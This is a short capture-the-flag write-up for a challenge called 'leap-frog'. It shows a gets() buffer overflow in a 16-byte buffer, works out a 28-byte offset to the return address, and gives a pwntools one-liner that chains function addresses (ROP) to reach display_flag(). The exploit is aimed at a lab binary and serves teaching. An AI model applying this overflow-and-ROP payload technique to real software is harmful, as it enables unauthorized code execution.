# leap-frog

## Problem

## Solution

```
void vuln() {
  char buf[16];
  printf("Enter your input> ");
  return gets(buf);
}
```

Buffer size: 16

Expected jump chain:

```
    vuln() -> leapA() -> leap2(int arg_check) -> leap3() -> display_flag()
```

Jump chain by address:

```
    0x080485e6 -> 0x080485fd (PLUS ARGUMENT) -> 0x08048666 -> 0x080486b3
```

buffer address: 0xffb1d9c0
EIP: 0xffb1d9dc

```
> p/d 0xffb1d9dc - 0xffb1d9c0
$1 = 28

```

You'd think this would work, but it doesn't because of the complex logic. But who say we need to follow the logic path? We HACKING!!! Burn the established paths!

Jump chain by sheer will:

```
    0x080485f3 -> 0x08048622 -> 0x08048690 -> 0x080486b3
```

### Craft the exploit

There will be `pop` calls in each function, so we'll have to add some data for it to eat...

```
python -c "from pwn import *;print 'A'*28+p32(0x080485e7)+p32(0x08048622)+p32(0x08048690)+p32(0x080486b3)" | ./rop
```
